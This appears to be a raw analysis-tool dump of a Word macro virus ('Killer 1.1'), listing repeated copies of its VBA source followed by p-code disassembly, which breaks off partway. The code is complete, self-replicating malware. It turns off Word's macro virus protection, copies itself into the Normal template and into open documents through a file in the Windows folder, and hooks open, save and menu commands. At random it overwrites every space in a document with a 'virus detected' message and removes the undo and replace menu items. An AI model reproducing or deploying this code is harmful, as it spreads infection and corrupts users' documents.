Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer40.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer40'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer41.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer41'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer42.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer42'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer43.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer44.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer44'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer45.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer45'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Winn
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/killer - 5344 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer1 - 4762 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer2 - 4762 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
